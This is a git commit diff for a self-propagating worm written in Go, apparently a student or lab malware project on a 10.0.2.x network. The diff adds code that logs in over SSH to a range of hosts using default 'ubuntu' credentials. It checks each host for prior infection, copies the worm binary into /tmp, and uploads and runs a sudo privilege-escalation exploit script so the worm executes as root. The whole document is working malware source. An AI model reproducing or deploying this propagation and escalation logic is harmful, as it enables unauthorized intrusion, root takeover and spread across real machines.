2389cddcb879ddee4ce0749476a32fb288b686a2
99graciamanel <manel.gracia.sola@gmail.com>
2021-11-14 07:44:11 -0500

    Prepared worm to infect and run itself in different machines as root using privilege scalation

--- worm/infection/sshInfection.go
+++ worm/infection/sshInfection.go
@@ -5,16 +5,24 @@ import (
 	"log"
 	"time"
 	"bytes"
+	"strconv"
+	"math/rand"
 )
 
 var (
-	username = "kali"
-	password = "kali"
+	username = "ubuntu"
+	password = "ubuntu"
+	worm_dir = "/tmp"
+	sudo_exploit_filename = "exploit_nss.py"
+	worm_filename = "worm" + strconv.Itoa(rand.Intn(3))
 	timeout = time.Minute
 )
 
-// Hello returns a greeting for the named person.
-func SshInfect(ip string) string {
+func OpenSSHConnection(ip string) (*ssh.Client, *ssh.Session) {
+	var c *ssh.Client
+	var s *ssh.Session
+	var err error
+
 	config := &ssh.ClientConfig{
 		User: username,
 		Auth: []ssh.AuthMethod{
@@ -27,21 +35,63 @@ func SshInfect(ip string) string {
 	if err != nil {
 		log.Fatal("Failed to dial: ", err)
 	}
-	defer client.Close()
-	session, err := client.NewSession()
+
+	s, err = client.NewSession()
 	if err != nil {
 		log.Fatal("Failed to create session: ", err)
 	}
-	defer session.Close()
-	var worm []byte
-	worm = GetFile("/proc/self/exe")
-	session.Stdin = bytes.NewReader(worm)
-	out,err := session.CombinedOutput("cat > /tmp/worm")
-	log.Printf("Command output: %q", out)
+	
+	return c,s
+}
 
+
+func SshCheckInfection(ip string) bool {
+	client, session := OpenSSHConnection(ip)
+	if client != nil {
+		defer client.Close()	
+	}
+	defer session.Close()
+	
+	out, _ := session.CombinedOutput("if [ -f \"" + worm_dir + "/" + worm_filename + "\" ]; then echo \"hola\"; fi;")
+	log.Printf("Command output: %q", out)
 	if len(out) != 0 {
 		log.Printf("Command output: %q", out)
+		return true
 	}
 
-	return "Finished"
+	return false
+}
+
+func SshInfect(ip string) string {
+	client, session := OpenSSHConnection(ip)
+	if client != nil {
+		defer client.Close()	
+	}
+	defer session.Close()
+	
+	var worm []byte
+	worm = GetFile(worm_dir + "/" + worm_filename)
+	session.Stdin = bytes.NewReader(worm)
+	session.CombinedOutput("cat > " + worm_dir + "/" + worm_filename)
+
+	return "Finished infecting"
+}
+
+
+func SshExploit(ip string) string {
+	client, session := OpenSSHConnection(ip)
+	if client != nil {
+		defer client.Close()	
+	}
+	defer session.Close()
+	
+	var exploit []byte
+	exploit = GetFile(worm_dir + "/" + sudo_exploit_filename)
+	session.Stdin = bytes.NewReader(exploit)
+	session.CombinedOutput("cat > " + worm_dir + "/" + sudo_exploit_filename + " && "  + 
+					 "cd " + worm_dir + " && " + 
+				         "chmod 0700 " + sudo_exploit_filename + " && " + 
+				         "echo '/bin/sh -c /tmp/worm' | ./" + sudo_exploit_filename)
+
+	return "Finished exploiting"
 }
--- worm/main/main.go
+++ worm/main/main.go
@@ -2,11 +2,22 @@ package main
 
 import (
 	"fmt"
-
+  	"strconv"
 	"github.com/99graciamanel/mlw/worm/infection"
 )
 
 func main() {
-	message := infection.SshInfect("10.0.2.5:22")
-	fmt.Println(message)
+	nAttackers := 5
+	for i := 11; i < nAttackers + 11; i++ {
+		ip_port := "10.0.2." +  strconv.Itoa(i) + ":22"
+		is_infected := infection.SshCheckInfection(ip_port)
+		fmt.Println(is_infected)
+		if is_infected {
+			return
+		}
+		message := infection.SshInfect(ip_port)
+		fmt.Println(message)
+		message = infection.SshExploit(ip_port)
+		fmt.Println(message)
+	}
 }
